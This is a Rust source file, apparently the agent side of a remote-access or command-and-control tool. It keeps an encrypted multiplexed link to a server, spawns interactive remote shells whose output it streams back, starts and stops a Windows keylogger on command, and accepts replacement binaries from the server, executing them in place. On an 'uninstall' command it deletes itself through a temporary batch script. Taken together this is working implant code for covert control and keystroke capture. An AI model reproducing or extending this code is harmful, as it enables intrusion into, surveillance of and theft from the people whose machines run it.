use std::collections::HashMap;
use std::io::Write;
use std::sync::atomic::{AtomicBool, AtomicU32, AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{SystemTime, UNIX_EPOCH};

use crossbeam::channel;

use shared::{
    error::NetworkError,
    multiplexing::{MIN_DATA_STREAM_ID, StreamId},
    packets::{
        AgentInstruction, KeyloggerAction, Packet, Packets, ShellCwd, ShellRequest,
        StreamClose, StreamData, StreamOpen, from_packet_bytes,
    },
};

use super::{ReadHalf, WriteHalf, client::Client, stream::Stream};
use crate::shell::{ShellSession, osc7::Osc7Scanner};
use shared::encryption::{decrypt, encrypt};

pub struct MultiplexManager {
    reader: Mutex<ReadHalf>,
    writer: Arc<Mutex<WriteHalf>>,
    shared_secret: [u8; 32],
    streams: Arc<Mutex<HashMap<StreamId, channel::Sender<Vec<u8>>>>>,
    next_id: AtomicU32,
    incoming_streams_tx: channel::Sender<Stream>,
    incoming_streams_rx: Arc<Mutex<channel::Receiver<Stream>>>,
    shutdown: Arc<AtomicBool>,
    #[cfg(target_os = "windows")]
    keylogger_session: Arc<Mutex<Option<crate::keylogger::KeyloggerSession>>>,
    latency_tracker: Arc<Mutex<Option<Arc<AtomicU64>>>>,
}

impl MultiplexManager {
    pub fn new(client: Client) -> Self {
        let (incoming_tx, incoming_rx) = channel::unbounded();

        let (reader, writer, shared_secret) = client.into_parts();

        Self {
            reader: Mutex::new(reader),
            writer,
            shared_secret,
            streams: Arc::new(Mutex::new(HashMap::new())),
            next_id: AtomicU32::new(MIN_DATA_STREAM_ID),
            incoming_streams_tx: incoming_tx,
            incoming_streams_rx: Arc::new(Mutex::new(incoming_rx)),
            shutdown: Arc::new(AtomicBool::new(false)),
            #[cfg(target_os = "windows")]
            keylogger_session: Arc::new(Mutex::new(None)),
            latency_tracker: Arc::new(Mutex::new(None)),
        }
    }

    /// Set the atomic counter that will be updated with measured RTT
    /// when the server echoes back a heartbeat.
    pub fn set_latency_tracker(&self, tracker: Arc<AtomicU64>) {
        if let Ok(mut lt) = self.latency_tracker.lock() {
            *lt = Some(tracker);
        }
    }

    /// Returns true if a shutdown has been requested.
    #[allow(dead_code)]
    pub fn is_shutdown(&self) -> bool {
        self.shutdown.load(Ordering::Relaxed)
    }

    /// Get a clone of the shutdown flag for use in other threads.
    pub fn shutdown_flag(&self) -> Arc<AtomicBool> {
        self.shutdown.clone()
    }

    /// Attempt to delete the agent binary.
    /// This is called when an uninstall shutdown is requested.
    #[allow(clippy::unused_self)]
    fn self_delete(&self) {
        use std::env;
        use std::fs;

        #[cfg(target_os = "windows")]
        use std::process::Command;

        let exe_path = match env::current_exe() {
            Ok(path) => path,
            Err(e) => {
                eprintln!("Failed to get current executable path: {e}");
                return;
            }
        };

        eprintln!("Attempting to delete: {}", exe_path.display());

        #[cfg(target_os = "windows")]
        {
            // On Windows, schedule deletion after process exits using a batch script
            let script = format!(
                "@echo off\n:wait\ntimeout /t 1 /nobreak >nul\ndel /f /q \"{}\" 2>nul\nif exist \"{}\" goto wait\ndel /f /q \"%~f0\"",
                exe_path.display(),
                exe_path.display()
            );

            if let Ok(temp_dir) = env::temp_dir().canonicalize() {
                let script_path = temp_dir.join("agent_cleanup.bat");
                if let Err(e) = fs::write(&script_path, script) {
                    eprintln!("Failed to write cleanup script: {e}");
                    return;
                }

                if let Err(e) = Command::new("cmd").arg("/C").arg(&script_path).spawn() {
                    eprintln!("Failed to spawn cleanup script: {e}");
                }
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            // On Unix-like systems, attempt direct deletion
            // The file will be removed from the filesystem but the process can continue running
            if let Err(e) = fs::remove_file(&exe_path) {
                eprintln!("Failed to delete binary: {e}");
            } else {
                eprintln!("Binary deleted successfully");
            }
        }
    }

    fn handle_update(
        self: &Arc<Self>,
        version: &str,
        binary_size: u64,
    ) -> Result<(), NetworkError> {
        eprintln!("Collecting update binary ({binary_size} bytes)...");

        let update_stream_id = 999_u32;
        #[allow(clippy::cast_possible_truncation)]
        let mut buffer = Vec::with_capacity(binary_size as usize);

        while (buffer.len() as u64) < binary_size {
            let mut reader_guard = self
                .reader
                .lock()
                .map_err(|_| NetworkError::LockError)?;
            let shared_secret = self.shared_secret;

            let mut len_buf = [0u8; 4];
            std::io::Read::read_exact(&mut *reader_guard, &mut len_buf)?;
            let len = u32::from_be_bytes(len_buf) as usize;

            let mut nonce_buf = [0u8; 12];
            std::io::Read::read_exact(&mut *reader_guard, &mut nonce_buf)?;

            let mut encrypted_buf = vec![0u8; len];
            std::io::Read::read_exact(&mut *reader_guard, &mut encrypted_buf)?;

            drop(reader_guard);

            let decrypted =
                shared::encryption::decrypt(&shared_secret, &nonce_buf, &encrypted_buf)?;
            let packet = shared::packets::from_packet_bytes(&decrypted)?;

            if let shared::packets::Packets::StreamData(data) = packet
                && data.stream_id == update_stream_id
            {
                buffer.extend_from_slice(&data.data);
                eprintln!(
                    "Update progress: {}/{} bytes",
                    buffer.len(),
                    binary_size
                );
            }
        }

        eprintln!("Update binary received, applying...");

        let exe_path = std::env::current_exe()?;
        let exe_dir = exe_path
            .parent()
            .ok_or_else(|| std::io::Error::other("No parent dir"))?;

        #[cfg(not(target_os = "windows"))]
        {
            use std::os::unix::process::CommandExt;

            let new_path = exe_dir.join("agent.new");
            std::fs::write(&new_path, &buffer)?;

            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                std::fs::set_permissions(&new_path, std::fs::Permissions::from_mode(0o755))?;
            }

            std::fs::rename(&new_path, &exe_path)?;

            eprintln!("Update applied (v{version}), restarting...");

            let err = std::process::Command::new(&exe_path).exec();
            eprintln!("exec failed: {err}");
            std::process::exit(0);
        }

        #[cfg(target_os = "windows")]
        {
            let old_path = exe_dir.join("agent.old.exe");
            let new_path = exe_dir.join("agent_update.exe");

            std::fs::write(&new_path, &buffer)?;

            let _ = std::fs::remove_file(&old_path);
            std::fs::rename(&exe_path, &old_path)?;
            std::fs::rename(&new_path, &exe_path)?;

            eprintln!("Update applied (v{version}), restarting...");

            std::process::Command::new(&exe_path).spawn()?;
            std::process::exit(0);
        }
    }

    #[allow(clippy::too_many_lines)]
    fn handle_shell_request(
        self: &Arc<Self>,
        shell_req: &ShellRequest,
    ) -> Result<(), NetworkError> {
        eprintln!("Shell request received: {:?}", shell_req.shell_type);

        // Spawn the shell session
        let shell_session = ShellSession::spawn(shell_req.shell_type)?;
        let (stdin, mut stdout, mut process) = shell_session.into_parts();

        // Wrap stdin in Arc<Mutex> for sharing between threads
        let stdin = Arc::new(Mutex::new(stdin));

        // Open a stream for this shell session
        let stream_id = self.next_id.fetch_add(1, Ordering::SeqCst);
        let (stream_tx, stream_rx) = channel::unbounded();

        {
            let mut streams = self.streams.lock().map_err(|_| NetworkError::LockError)?;
            streams.insert(stream_id, stream_tx);
        }

        let open_packet = StreamOpen { stream_id };
        self.send_packet(&open_packet.serialize()?)?;

        eprintln!("Shell stream opened: {stream_id}");

        // Emit the initial cwd immediately so clients get the agent's spawn
        // directory before the first shell prompt fires PROMPT_COMMAND.
        if let Ok(cwd) = std::env::current_dir() {
            let initial_cwd = ShellCwd {
                stream_id,
                path: cwd.to_string_lossy().into_owned(),
            };
            if let Ok(bytes) = initial_cwd.serialize() {
                let _ = self.send_packet(&bytes);
            }
        }

        // Spawn thread to read shell output and send to stream
        let self_clone = self.clone();
        thread::spawn(move || {
            use std::io::Read;

            let mut scanner = Osc7Scanner::new();
            let mut buffer = vec![0u8; 4096];
            loop {
                // Check if process is still running
                match process.try_wait() {
                    Ok(Some(_)) => {
                        eprintln!("Shell process exited");
                        let close_packet = StreamClose { stream_id };
                        let _ = self_clone.send_packet(&close_packet.serialize().unwrap());
                        break;
                    }
                    Ok(None) => {
                        // Process still running, try to read
                        match stdout.read(&mut buffer) {
                            Ok(0) => {
                                // EOF
                                eprintln!("Shell stdout closed");
                                let close_packet = StreamClose { stream_id };
                                let _ = self_clone.send_packet(&close_packet.serialize().unwrap());
                                break;
                            }
                            Ok(n) => {
                                let (clean, cwd_opt) = scanner.feed(&buffer[..n]);
                                if !clean.is_empty() {
                                    let data_packet = StreamData {
                                        stream_id,
                                        data: clean,
                                    };
                                    if let Err(e) =
                                        self_clone.send_packet(&data_packet.serialize().unwrap())
                                    {
                                        eprintln!("Failed to send shell output: {e}");
                                        break;
                                    }
                                }
                                if let Some(path) = cwd_opt {
                                    let cwd_packet = ShellCwd { stream_id, path };
                                    if let Err(e) =
                                        self_clone.send_packet(&cwd_packet.serialize().unwrap())
                                    {
                                        eprintln!("Failed to send shell cwd: {e}");
                                        break;
                                    }
                                }
                            }
                            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                                // No data available, continue
                                std::thread::sleep(std::time::Duration::from_millis(10));
                            }
                            Err(e) => {
                                eprintln!("Error reading shell output: {e}");
                                break;
                            }
                        }
                    }
                    Err(e) => {
                        eprintln!("Error checking process status: {e}");
                        break;
                    }
                }
            }
        });

        // Spawn thread to read from stream and write to shell stdin
        thread::spawn(move || {
            use std::io::Write;

            while let Ok(data) = stream_rx.recv() {
                let mut stdin_guard = match stdin.lock() {
                    Ok(guard) => guard,
                    Err(e) => {
                        eprintln!("Failed to lock stdin: {e}");
                        break;
                    }
                };

                if let Err(e) = stdin_guard.write_all(&data) {
                    eprintln!("Failed to write to shell stdin: {e}");
                    break;
                }

                if let Err(e) = stdin_guard.flush() {
                    eprintln!("Failed to flush shell stdin: {e}");
                    break;
                }
            }
        });

        Ok(())
    }

    #[allow(clippy::unused_self, clippy::unnecessary_wraps)]
    fn handle_keylogger_request(
        self: &Arc<Self>,
        req: &shared::packets::KeyloggerRequest,
    ) -> Result<(), NetworkError> {
        match req.action {
            KeyloggerAction::Start => {
                #[cfg(target_os = "windows")]
                {
                    let mut session_guard =
                        self.keylogger_session.lock().map_err(|_| NetworkError::LockError)?;
                    if session_guard.is_some() {
                        eprintln!("Keylogger already running");
                        return Ok(());
                    }
                    let session = crate::keylogger::KeyloggerSession::start(self.clone());
                    *session_guard = Some(session);
                    eprintln!("Keylogger started");
                }
                #[cfg(not(target_os = "windows"))]
                {
                    eprintln!("Keylogger not supported on this platform");
                }
            }
            KeyloggerAction::Stop => {
                #[cfg(target_os = "windows")]
                {
                    let mut session_guard =
                        self.keylogger_session.lock().map_err(|_| NetworkError::LockError)?;
                    if let Some(mut session) = session_guard.take() {
                        session.stop();
                        eprintln!("Keylogger stopped");
                    } else {
                        eprintln!("No keylogger session to stop");
                    }
                }
                #[cfg(not(target_os = "windows"))]
                {
                    eprintln!("Keylogger not supported on this platform");
                }
            }
        }
        Ok(())
    }

    pub fn start(self: &Arc<Self>) -> thread::JoinHandle<()> {
        let self_clone = self.clone();
        thread::spawn(move || {
            if let Err(e) = self_clone.receive_loop() {
                eprintln!("Multiplex receive loop error: {e}");
            }
        })
    }

    #[allow(dead_code)]
    pub fn open_stream(self: &Arc<Self>) -> Result<Stream, NetworkError> {
        let stream_id = self.next_id.fetch_add(1, Ordering::SeqCst);

        let (stream_tx, stream_rx) = channel::unbounded();

        {
            let mut streams = self.streams.lock().map_err(|_| NetworkError::LockError)?;
            if streams.contains_key(&stream_id) {
                return Err(NetworkError::StreamAlreadyExists(stream_id));
            }
            streams.insert(stream_id, stream_tx);
        }

        let open_packet = StreamOpen { stream_id };
        self.send_packet(&open_packet.serialize()?)?;

        Ok(Stream::new(stream_id, self.clone(), stream_rx))
    }

    pub fn accept_stream(&self) -> Result<Stream, NetworkError> {
        let rx = self
            .incoming_streams_rx
            .lock()
            .map_err(|_| NetworkError::LockError)?;
        rx.recv().map_err(|_| NetworkError::ChannelReceiveError)
    }

    pub fn send_on_stream(&self, stream_id: StreamId, data: Vec<u8>) -> Result<(), NetworkError> {
        let packet = StreamData { stream_id, data };
        self.send_packet(&packet.serialize()?)
    }

    pub fn send_control_packet(&self, buf: &[u8]) -> Result<(), NetworkError> {
        self.send_packet(buf)
    }

    #[allow(dead_code)]
    pub fn close_stream(&self, stream_id: StreamId) -> Result<(), NetworkError> {
        {
            let mut streams = self.streams.lock().map_err(|_| NetworkError::LockError)?;
            streams.remove(&stream_id);
        }
        let close_packet = StreamClose { stream_id };
        self.send_packet(&close_packet.serialize()?)
    }

    fn receive_loop(self: &Arc<Self>) -> Result<(), NetworkError> {
        loop {
            let data = self.receive_packet()?;

            let packet = from_packet_bytes(&data)?;

            match packet {
                Packets::StreamOpen(open) => {
                    self.handle_stream_open(&open)?;
                }
                Packets::StreamClose(close) => {
                    self.handle_stream_close(&close)?;
                }
                Packets::StreamData(data_packet) => {
                    self.handle_stream_data(data_packet)?;
                }
                Packets::StreamError(error) => {
                    eprintln!("Stream {} error: {}", error.stream_id, error.error);
                }
                Packets::Heartbeat(hb) => {
                    if hb.sent_at_ms > 0 {
                        #[allow(clippy::cast_possible_truncation)]
                        let now_ms = SystemTime::now()
                            .duration_since(UNIX_EPOCH)
                            .unwrap_or_default()
                            .as_millis() as u64;
                        let rtt = now_ms.saturating_sub(hb.sent_at_ms);
                        if let Ok(lt) = self.latency_tracker.lock()
                            && let Some(tracker) = lt.as_ref()
                        {
                            tracker.store(rtt, Ordering::Relaxed);
                        }
                    }
                }
                Packets::AgentControl(control) => {
                    match control.instruction {
                        AgentInstruction::Shutdown { reason } => {
                            eprintln!("Shutdown requested by server: {reason}");

                            // Check if this is an uninstall request
                            if reason.to_lowercase().contains("uninstall") {
                                eprintln!("Uninstall detected, initiating self-delete...");
                                self.self_delete();
                            }

                            self.shutdown.store(true, Ordering::Relaxed);
                            return Ok(());
                        }
                        AgentInstruction::Restart { reason } => {
                            eprintln!("Restart requested by server: {reason}");
                            // TODO: implement restart logic
                        }
                        AgentInstruction::RequestSystemInfo => {
                            eprintln!("System info requested by server");
                            // TODO: send system info immediately
                        }
                        AgentInstruction::Pause => {
                            eprintln!("Pause requested by server");
                            // TODO: implement pause logic
                        }
                        AgentInstruction::Resume => {
                            eprintln!("Resume requested by server");
                            // TODO: implement resume logic
                        }
                        AgentInstruction::Update {
                            version,
                            binary_size,
                        } => {
                            eprintln!(
                                "Update requested: version {version}, size {binary_size} bytes"
                            );
                            if let Err(e) = self.handle_update(&version, binary_size) {
                                eprintln!("Update failed: {e}");
                            }
                        }
                    }
                }
                Packets::ShellRequest(shell_req) => {
                    self.handle_shell_request(&shell_req)?;
                }
                Packets::KeyloggerRequest(req) => {
                    self.handle_keylogger_request(&req)?;
                }
                _ => {
                    eprintln!("Unexpected packet in multiplex receive loop");
                }
            }
        }
    }

    fn handle_stream_open(self: &Arc<Self>, open: &StreamOpen) -> Result<(), NetworkError> {
        let stream_id = open.stream_id;

        let (tx, rx) = channel::unbounded();

        {
            let mut streams = self.streams.lock().map_err(|_| NetworkError::LockError)?;
            if streams.contains_key(&stream_id) {
                return Err(NetworkError::StreamAlreadyExists(stream_id));
            }
            streams.insert(stream_id, tx.clone());
        }

        let stream = Stream::new(stream_id, self.clone(), rx);
        self.incoming_streams_tx
            .send(stream)
            .map_err(|_| NetworkError::ChannelSendError)?;
        Ok(())
    }

    fn handle_stream_close(&self, close: &StreamClose) -> Result<(), NetworkError> {
        let mut streams = self.streams.lock().map_err(|_| NetworkError::LockError)?;
        streams.remove(&close.stream_id);
        Ok(())
    }

    fn handle_stream_data(&self, data: StreamData) -> Result<(), NetworkError> {
        let streams = self.streams.lock().map_err(|_| NetworkError::LockError)?;

        if let Some(tx) = streams.get(&data.stream_id) {
            tx.send(data.data)
                .map_err(|_| NetworkError::ChannelSendError)?;
        } else {
            eprintln!("Received data for unknown stream: {}", data.stream_id);
        }

        Ok(())
    }

    fn send_packet(&self, buf: &[u8]) -> Result<(), NetworkError> {
        let (encrypted_buf, nonce) = encrypt(&self.shared_secret, buf)?;

        #[allow(clippy::cast_possible_truncation)]
        let len = encrypted_buf.len() as u32;
        let total_size = 4 + nonce.len() + encrypted_buf.len();
        let mut data = vec![0u8; total_size];

        data[0..4].copy_from_slice(&len.to_be_bytes());
        data[4..16].copy_from_slice(&nonce);
        data[16..].copy_from_slice(&encrypted_buf);

        let mut writer = self.writer.lock().map_err(|_| NetworkError::LockError)?;
        writer.write_all(&data)?;
        writer.flush()?;
        Ok(())
    }

    fn receive_packet(&self) -> Result<Vec<u8>, NetworkError> {
        let mut reader = self.reader.lock().map_err(|_| NetworkError::LockError)?;

        let mut len_buf = [0u8; 4];
        reader.read_exact(&mut len_buf)?;

        let len = u32::from_be_bytes(len_buf) as usize;
        if len == 0 {
            return Ok(Vec::new());
        }

        let mut nonce_buf = vec![0u8; 12];
        reader.read_exact(&mut nonce_buf)?;

        let mut encrypted_buf = vec![0u8; len];
        reader.read_exact(&mut encrypted_buf)?;

        let decrypted_data = decrypt(&self.shared_secret, &nonce_buf, &encrypted_buf)?;

        Ok(decrypted_data)
    }
}
